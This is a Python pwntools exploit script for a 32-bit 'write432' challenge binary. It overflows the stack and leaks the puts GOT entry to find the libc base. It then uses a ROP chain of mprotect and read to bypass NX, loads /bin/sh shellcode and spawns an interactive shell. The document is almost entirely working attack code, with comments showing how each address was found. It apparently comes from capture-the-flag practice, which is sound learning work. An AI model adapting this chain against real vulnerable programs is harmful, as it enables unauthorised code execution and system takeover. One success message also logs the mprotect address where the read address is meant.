from pwn import * 

e = ELF("./write432") #open binary 
libc = ELF("/lib/i386-linux-gnu/libc-2.27.so") #open libc
p = process(e.path) #create a process
p.sendline(cyclic(400)) #send 400 pattern offset
p.wait() #wait for the process response
core = p.corefile #create a corefile to know where is corret EIP overflow offset
eip_offset = cyclic_find(core.eip) #search on the corefile the EIP offset
info("Found eip offset %d", eip_offset)

p = process(e.path)
p.recv() #receive the program output (necessary) 

pop3ret = 0x80486d9  #gdb_peda -> ropgadget
shellcode_addr = 0x08048000 #vmmap -> 0x08048000 0x08049000 r-xp /root/Desktop/challs/write432
puts = 0x8048420 #gdb_peda -> elfsymbol
puts_got= 0x804a014 #gdb_peda -> pd puts@plt 
main = 0x804857b #x main

#leak puts_GOT address 
payload = cyclic(eip_offset)
payload += p32(puts)
payload += p32(main) #back to main after puts_GOT leak
payload += p32(puts_got)
payload += p32(0)
p.sendline(payload)

leaked_puts_got = u32(p.recv()[0:4]) #receive puts_GOT address 
success("Found leaked puts got value: %#x", leaked_puts_got)

libc_puts = 0x00067250  #readelf -a /lib/i386-linux-gnu/libc-2.27.so | grep puts@@GLIBC_2.0
libc_base = leaked_puts_got - libc_puts     #calculate libc_base

success("Found libc base value: %#x", libc_base)

libc_mprotect = libc_base + 0x000f2d60 #readelf -a /lib/i386-linux-gnu/libc-2.27.so | grep mprotect@@GLIBC_2.0
libc_read = libc_base + 0x000e57b0     #readelf -a /lib/i386-linux-gnu/libc-2.27.so | grep read@@GLIBC_2.0

success("Found libc mprotect value: %#x", libc_mprotect)
success("Found libc read value: %#x", libc_mprotect)

#bypass DEP NX using mprotect from libc
payload = cyclic(eip_offset)
payload += p32(libc_mprotect) 
payload += p32(pop3ret)
payload += p32(shellcode_addr)
payload += p32(0x100000) #mprotect size
payload += p32(0x7) #mprotect RXW permission

#read shellcode using read from libc
payload += p32(libc_read)
payload += p32(pop3ret)
payload += p32(0x0) #stdin fd
payload += p32(shellcode_addr)
payload += p32(1024) #read size

#execute shellcode onto the stack
payload += p32(shellcode_addr)

p.sendline(payload) #sending first payload to bypass NX and triggering read function
p.sendline(asm(shellcraft.sh())) #create shellcode using pwntools shellcraft then send it to the read function

#get shell
p.interactive()
